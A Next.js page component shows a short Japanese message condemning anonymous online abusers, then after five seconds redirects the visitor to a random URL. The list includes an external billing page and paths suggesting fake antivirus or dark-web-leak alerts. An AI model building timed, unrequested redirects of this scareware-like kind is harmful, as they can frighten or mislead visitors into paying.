"use client";

import { useEffect } from "react";

const REDIRECT_AFTER_MS = 5000;

const REDIRECT_CANDIDATES = [
  "https://google.com",
  "https://www.sukikiraivrc.com/billing",
  "/super_ai_judge",
  "/premier_member",
  "/reiwa_antivirus",
  "/sns_flame_risk",
  "/darkweb_leak",
  "/internet_aptitude",
];

function pickRandomRedirectUrl(): string {
  const idx = Math.floor(Math.random() * REDIRECT_CANDIDATES.length);
  return REDIRECT_CANDIDATES[idx] ?? REDIRECT_CANDIDATES[0]!;
}

export default function Home() {
  useEffect(() => {
    const url = pickRandomRedirectUrl();
    const timer = setTimeout(() => {
      window.location.assign(url);
      // console.log("Redirect blocked for debugging:", url);
    }, REDIRECT_AFTER_MS);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="min-h-screen flex items-center justify-center bg-slate-100 p-4">
      <div className="w-full max-w-2xl">
        <div className="bg-white rounded-2xl p-8">
          <div className="text-center space-y-4">
            <h1 className="text-3xl font-bold text-slate-800">
              人間は匿名という環境に置かれると強くなります
            </h1>

            <p className="text-slate-600 leading-relaxed">
              他人を傷つける人間性が欠如した人たちは、ネットから身を置くべきです。
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
